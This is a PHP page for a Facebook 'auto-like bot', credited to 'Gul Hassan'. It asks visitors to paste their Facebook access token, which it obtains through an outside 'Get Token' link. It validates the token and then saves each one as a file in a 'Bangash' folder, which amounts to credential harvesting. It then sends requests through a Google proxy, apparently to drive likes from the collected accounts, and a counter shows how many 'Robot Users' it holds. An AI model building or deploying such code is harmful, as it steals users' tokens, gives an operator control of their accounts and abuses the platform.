
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-6611228085956992",
    enable_page_level_ads: true
  });
</script><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
Gul Hassan
</title><link rel="stylesheet" type="text/css" href="B.css"
<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet"> 
<center><div style="font-family: 'Merienda', cursive;
font-size: 30pt">
<center><script language="JavaScript" src="B.js"></script></font></center>


<?php
$yx=opendir('Bangash');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Bangash($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Bangash($access){
if(!is_dir('Bangash')){
mkdir('Bangash');
}
$a=fopen('Bangash/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script>window.alert("Your Token is Invalid, Try Again :)");</script>';
$this->form();
}
public function form(){
 echo '
 </br>
 
<center> <a target="_blank"  https://www.facebook.com/100009977767685"><img src="a.jpg" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div>
 </br> </br>
<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
<center><div style="font-family: Merienda;
font-size: 30pt">
<div id="center">

<a href="http://ip-token.byethost13.com/" target="_blank">

<input class="button" type="button" value="Get Token"></a></center>


<form action="index.php" method="post">

<input class="search" type="text1" style="width:65%" name="access_token" placeholder="Paste Your Access Token Here" required></br>

<input class="submit" type="submit" value="Submit"></form></div>
</form></center><br>
</font><br>
<center><link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
<center><div style="font-family: Merienda;
font-size: 30pt">
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Merienda;
<font color="white" size="15"> Made By  <font color="red">Gul Hassan </a></br>
</b></a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

<center>
<center> <a target="_blank"  https://www.facebook.com/100009977767685"><img src="a.jpg" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div>

<br>
<link href="https://fonts.googleapis.com/css?family=Merienda"  rel="stylesheet" 
<center><div style="font-family: Merienda;
font-size: 30pt"> 
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Merienda;
<div id="center"><marquee behavior="alternate"> Bot Successfully Activated </marquee>

</br>

<div id="center">
<center><strong> <font color="white">
<center>
<font color="white" size="15">  Token Saved! </font></br>
[<a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div></center>
</br>
</div>
<center><div style="font-family: Merienda;
font-size: 30pt">
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Merienda;
<font color="white" size="15"> Made By  <font color="red">Gul Hassan </a>
</div>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
<br>
<link href="https://fonts.googleapis.com/css?family=Merienda"  rel="stylesheet" type="text/css">
<center><div style="font-family: Merienda;
font-size: 30pt">
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Merienda;
<div id="header">
<?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'Bangash/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
    echo "Robot Users : $i ";
?>
</div>
 <script type="text/javascript" src=""></script>
<script language="javascript" type="text/javascript" src="ali.js"></script>
<div class="kddtop"> <div class="kddtut"> <p>
